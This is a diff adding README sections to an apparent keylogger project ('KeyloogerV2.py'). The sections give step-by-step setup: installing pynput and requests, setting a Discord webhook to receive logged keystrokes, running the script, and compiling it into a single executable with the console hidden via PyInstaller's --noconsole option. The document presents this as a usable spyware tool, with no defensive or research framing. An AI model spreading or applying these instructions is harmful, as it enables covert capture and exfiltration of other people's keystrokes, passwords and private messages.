@@ -13,6 +13,61 @@ from pynput.keyboard import Key, Listener
 ```
 The script imports the `requests` module, which allows it to send HTTP requests. It also imports `Key` and `Listener` from `pynput.keyboard`, which are used for capturing keyboard input.
 
+## Installation and Usage
+### Installation
+To use this script, you need to have Python installed on your machine. If you don't have Python, you can download it from the official site: https://www.python.org/downloads/.
+
+You will also need to install the following Python packages: `requests` and `pynput`. These can be installed via pip, which is a package manager for Python. If you have Python installed, you likely have pip installed as well.
+
+To install these packages, open a terminal window and run the following commands:
+```
+pip install requests
+pip install pynput
+```
+
+### Usage
+1. Clone this repository to your local machine.
+```
+git clone https://github.com/LvL23HT/KeyloogerBasic.git
+```
+2. Open the script with a text editor and replace the WEBHOOK_URL variable with your Discord webhook URL.
+```
+cd KeyloogerBasic
+nano KeyloogerV2.py
+```
+3. Save and close the file.
+
+4. To run the script, open a terminal window, navigate to the directory where the script is located, and then run the following command:
+```
+python KeyloogerV2.py
+```
+
+The script will start running and will record all keyboard input. The input is logged to a file defined by the LOG_FILE variable.
+
+To send the log file via the Discord webhook, press the F12 key. The script will stop after sending the log file.
+
+## Compile for Windows, Linux or macOS
+PyInstaller is a program that converts Python applications into stand-alone executables, under Windows, Linux, and macOS.
+
+If you don't have PyInstaller installed, you can install it via pip:
+```
+pip install pyinstaller
+```
+
+Once PyInstaller is installed, you can use it to compile your Python script into an executable file. To do this with the console window hidden, use the `--noconsole` and `--onefile` options:
+```
+pyinstaller --onefile --noconsole KeyloogerV2.py
+
+```
+
+The `--onefile` option tells PyInstaller to create a single executable file, and `--noconsole` ensures that the console window will not appear when the executable is run.
+
+After running this command, PyInstaller will create a new directory named `dist` in the current directory. Inside the `dist` directory, you will find your executable file. You can run this file just like any other executable, and it will execute your Python script without showing a console window.
+
+## Demo:
+![WEBHOOKS](https://i.ibb.co/XZM2JLy/Screenshot-2023-08-01-10-11-42-71-572064f74bd5f9fa804b05334aa4f912.jpg)
+
+
 ## Global variables:
 ```
 LOG_FILE = 'log.txt'
